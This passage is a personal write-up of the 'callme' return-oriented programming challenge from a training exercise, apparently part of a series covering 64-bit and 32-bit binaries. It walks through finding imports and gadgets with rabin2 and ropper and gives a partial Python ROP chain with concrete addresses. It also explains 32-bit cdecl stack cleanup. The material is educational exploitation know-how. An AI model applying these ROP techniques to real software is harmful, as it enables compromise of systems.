+<p>After I solved it (while working on this writeup), I noticed the warning in the
+instructions and thought I’d try those commands to see what the difference was.</p>
+<section id="list-imports">
+<h3>List Imports<a class="headerlink" href="#list-imports" title="Permalink to this headline">#</a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ rabin2 -i callme
+<span class="o">[</span>Imports<span class="o">]</span>
+nth vaddr      <span class="nb">bind</span>   <span class="nb">type</span>   lib name
+―――――――――――――――――――――――――――――――――――――
+<span class="m">4</span>   0x00401810 GLOBAL FUNC       callme_three
+<span class="m">8</span>   0x00401850 GLOBAL FUNC       callme_one
+<span class="m">11</span>  0x00401870 GLOBAL FUNC       callme_two
+</pre></div>
+</div>
+</section>
+<section id="list-relocations">
+<h3>List Relocations<a class="headerlink" href="#list-relocations" title="Permalink to this headline">#</a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ rabin2 -R callme
+<span class="o">[</span>Relocations<span class="o">]</span>
+
+vaddr      paddr      <span class="nb">type</span>   name
+―――――――――――――――――――――――――――――――――
+0x00602028 0x00002028 SET_64 callme_three
+0x00602048 0x00002048 SET_64 callme_one
+0x00602058 0x00002058 SET_64 callme_two
+</pre></div>
+</div>
+<p>At first, I looked at this and was trying to understand what the point was but
+then an idea hit me and I did some checking. From within ghidra, I looked at the
+<code class="docutils literal notranslate"><span class="pre">.got.plt</span></code> section of <code class="docutils literal notranslate"><span class="pre">callme</span></code> (under <strong>Program Trees</strong>) and I saw the
+following:</p>
+<p><img alt="got" src="../../_images/got_rop_02.png" /></p>
+<p>From the <code class="docutils literal notranslate"><span class="pre">got</span></code>, it becaume obvious that <em>Relocations</em> view was showing the
+<code class="docutils literal notranslate"><span class="pre">vaddr</span></code> from the <code class="docutils literal notranslate"><span class="pre">got</span></code>.</p>
+<blockquote>
+<div><p>NOTE: I’m still unclear as to why the author of the challenge stressed this
+and need to dig further into it.</p>
+</div></blockquote>
+</section>
+<section id="brute-force-approach-list-symbols">
+<h3>Brute Force Approach (list symbols)<a class="headerlink" href="#brute-force-approach-list-symbols" title="Permalink to this headline">#</a></h3>
+<p>There is probably somthing not right about this approach, but it also worked
+pretty easily:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ rabin2 -s callme <span class="p">|</span> grep callme_
+<span class="m">4</span>    0x00001810 0x00401810 GLOBAL FUNC   <span class="m">16</span>       imp.callme_three
+<span class="m">8</span>    0x00001850 0x00401850 GLOBAL FUNC   <span class="m">16</span>       imp.callme_one
+<span class="m">11</span>   0x00001870 0x00401870 GLOBAL FUNC   <span class="m">16</span>       imp.callme_two
+</pre></div>
+</div>
+</section>
+</section>
+<section id="finding-rop-gadgets">
+<h2>Finding ROP Gadgets<a class="headerlink" href="#finding-rop-gadgets" title="Permalink to this headline">#</a></h2>
+<p>Based on what we know about the x64 calling convention combined with the
+instructions provided for the challenge, we know that we need to place the value
+<code class="docutils literal notranslate"><span class="pre">1</span></code> in the <code class="docutils literal notranslate"><span class="pre">rdi</span></code> register, <code class="docutils literal notranslate"><span class="pre">2</span></code> in <code class="docutils literal notranslate"><span class="pre">rsi</span></code> and <code class="docutils literal notranslate"><span class="pre">3</span></code> in <code class="docutils literal notranslate"><span class="pre">rdx</span></code>. Using <code class="docutils literal notranslate"><span class="pre">ropper</span></code>, I was
+quickly able to find a gadget for <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdi,</span> <span class="pre">ret</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ ropper --file callme --search <span class="s2">&quot;pop rdi; ret&quot;</span>
+0x0000000000401b23: pop rdi<span class="p">;</span> ret<span class="p">;</span>
+</pre></div>
+</div>
+<p>Unfortunately, while I was able to also find one for <code class="docutils literal notranslate"><span class="pre">rdx</span></code>, I could not find an
+entry for <code class="docutils literal notranslate"><span class="pre">rsi</span></code>. This pushed me to read the docs on <code class="docutils literal notranslate"><span class="pre">ropper</span></code> a bit more and,
+after doing that, I tried a less-specific search:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ ropper --file callme --search <span class="s2">&quot;pop rsi&quot;</span>
+0x0000000000401b21: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span>
+0x0000000000401ab1: pop rsi<span class="p">;</span> pop rdx<span class="p">;</span> ret<span class="p">;</span>
+</pre></div>
+</div>
+<p>While the first one was OK, the second was extremely helpful as I could take
+care of both the second and third parameters at once.</p>
+</section>
+<section id="building-the-rop-chain">
+<h2>Building the ROP Chain<a class="headerlink" href="#building-the-rop-chain" title="Permalink to this headline">#</a></h2>
+<p>Having obtained the information we needed, I now just need to build up the rop
+chain. The process is strait-forward and looks like this:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># set up our constants</span>
+<span class="n">call_one</span> <span class="o">=</span> <span class="mh">0x401850</span>
+<span class="n">call_two</span> <span class="o">=</span> <span class="mh">0x401870</span>
+<span class="n">call_three</span> <span class="o">=</span> <span class="mh">0x401810</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401b23</span>
+<span class="n">pop_rsi_pop_rdx</span> <span class="o">=</span> <span class="mh">0x401ab1</span>
+
+<span class="c1"># start by calling callme_one()</span>
+<span class="n">rop_chain</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+<span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+<span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_rdx</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+<span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+<span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+<span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_one</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s2">&quot;little&quot;</span><span class="p">)</span>
+
+<span class="c1"># similar process repeats for callme_two() and callme_three()</span>
+</pre></div>
+</div>
+</section>
+<section id="solution">
+<h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">#</a></h2>
+<p>Having put everything together, I ran the script with the following results:</p>
+<p><img alt="solution" src="../../_images/solution_02.png" /></p>
+<p>The solution is available in <span class="xref myst">exploit_02.py</span></p>
+</section>
+<section id="bit-version">
+<h2>32 Bit Version<a class="headerlink" href="#bit-version" title="Permalink to this headline">#</a></h2>
+<p>So, I assumed the 32 bit version would be <em>easy</em>… a simple variant of the 64
+bit version with a few minor modifications. How incredibly wrong I was. It
+kicked my tail… hard. That said, I now understand how the stack works <em>much</em>
+better and anticipate the subsequent 32-bit challenges to be less of a hill to
+climb.</p>
+<p>The initial portion of the process is exactly as you would expect (determining
+the offset, etc.). Where things differed for me was in building the ROP chain.<br />
+We know that 32-bit calling convention uses stack-based parameter passing (vs.<br />
+the registers that 64 bit uses). We also know that the parameters should be
+pushed on the stack in reverse order (right-to-left). This means that it should
+look something like the following:</p>
+<blockquote>
+<div><p>NOTE: this is <em>not</em> correct… keep reading</p>
+</div></blockquote>
+<table class="colwidths-auto table">
+<thead>
+<tr class="row-odd"><th class="head"><p>ptr callme one</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>1</p></td>
+</tr>
+<tr class="row-odd"><td><p>2</p></td>
+</tr>
+<tr class="row-even"><td><p>3</p></td>
+</tr>
+<tr class="row-odd"><td><p>ptr callme two</p></td>
+</tr>
+<tr class="row-even"><td><p>1</p></td>
+</tr>
+<tr class="row-odd"><td><p>2</p></td>
+</tr>
+<tr class="row-even"><td><p>3</p></td>
+</tr>
+<tr class="row-odd"><td><p>ptr callme three</p></td>
+</tr>
+<tr class="row-even"><td><p>1</p></td>
+</tr>
+<tr class="row-odd"><td><p>2</p></td>
+</tr>
+<tr class="row-even"><td><p>3</p></td>
+</tr>
+</tbody>
+</table>
+<p>However, this didn’t work. I kept getting an error that indicating that I was
+passing the parameters in incorrectly. I “solved” this (read: without
+understanding) by adding an “dummy” parameter in between the function pointer
+and the first parameter. This “worked” for the call to <code class="docutils literal notranslate"><span class="pre">callme_one()</span></code> but every
+subsequent call failed with a segfault. Those of you who understand the stack
+better than I did at this point understand exactly what I did wrong. It became
+obvious to me that I didn’t understand exactly what was going on, so I spent the
+majority of an afternoon fighting for understanding (read: stepping
+assembly-instruction-by-assembly-instruction through GDB, drawing out the stack,
+etc.). Having done this, I now understand… well… <em>better</em>.</p>
+<p>The key is, that the magical buffer space between the function pointer and the
+first parameter should be the ptr to the function called upon return. This
+leaves you with the question of what that should be? The answer comes from two
+places. First, in watching the behavior of the stack as other functions are
+called as well as a sideways hint in the online documentation regarding how the
+32 bit calling conventions work. The key phrase here is “caller cleanup” within
+<code class="docutils literal notranslate"><span class="pre">cdecl</span></code>. This means that the caller is responsible for adjusting the stack after
+a function call to make it ready for the  next function call. If you step
+through a handful of function calls within GDB you will obvserve this…<br />
+following a return you will see a <code class="docutils literal notranslate"><span class="pre">add</span> <span class="pre">esp,</span> <span class="pre">0x10</span></code> or <code class="docutils literal notranslate"><span class="pre">add</span> <span class="pre">esp,</span> <span class="pre">0xc</span></code> or similar.<br />
+In this case, we had three 4-byte slots on the stack, so we needed to move the
+stack pointers “up” by 12 (<code class="docutils literal notranslate"><span class="pre">0xc</span></code>) spots (effectively three “pop” commands).</p>
+<p>Here, I set out to find a ROP gadget to meet my needs… hopefully something
+like <code class="docutils literal notranslate"><span class="pre">add</span> <span class="pre">esp,</span> <span class="pre">0xc;</span> <span class="pre">ret;</span></code>. I didn’t find that, but I did find a <code class="docutils literal notranslate"><span class="pre">add</span> <span class="pre">esp,</span> <span class="pre">8;</span> <span class="pre">pop</span>&#160; <span class="pre">ebx;</span> <span class="pre">ret;</span></code> gadget at <code class="docutils literal notranslate"><span class="pre">0x8048576</span></code>. This <em>effectively</em> does the same thing I
+needed. I plugged it in to my ROP chain and I was immdiately successful. After
+returning from each call, I clean up and the <code class="docutils literal notranslate"><span class="pre">ret</span></code> at the end sets me up for the
+next function call (from the now top of the stack).</p>
+<p>The 32-bit solution is availalble in <span class="xref myst">exploit_0232.py</span>.</p>
+</section>
+<section id="what-did-i-learn">
+<h2>What Did I Learn?<a class="headerlink" href="#what-did-i-learn" title="Permalink to this headline">#</a></h2>
+<p>The 64-bit version of this went rather quickly for me and, coming on the heels
+of 01 challenge, was an incredible encouragement… it convinced me I actually
+<em>did</em> understand the core concepts. That was great.</p>
+<p>The 32-bit version convinced me I knew nothing. Actually, not entirely, but it
+forced me to really strengthen my understanding of the 32-bit calling
+conventions.</p>
+<p>Specific learnings:</p>
+<ul class="simple">
+<li><p>I can ROP</p></li>
+<li><p>32-bit calling conventions and stack use</p></li>
+<li><p>Greatly increased comfort in stepping through/debugging assembly with GDB</p></li>
+</ul>
+</section>
+</section>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./ctf/re"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            </main>
+            <footer class="footer-article noprint">
+                
+    <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+    <a class='left-prev' id="prev-link" href="01_split.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Challenge 01: split</p>
+        </div>
+    </a>
+    <a class='right-next' id="next-link" href="03_write4.html" title="next page">
+    <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Challenge 03: write4</p>
+    </div>
+    <i class="fas fa-angle-right"></i>
+    </a>
+</div>
+            </footer>
+        </div>
+    </div>
+    <div class="footer-content row">
+        <footer class="col footer"><p>
+  
+    By Rob Gillen<br/>
+  
+      &copy; Copyright 2022.<br/>
+</p>
+        </footer>
+    </div>
+    
+</div>
+
+
+      </div>
+    </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>
+
+
+  </body>
+</html>
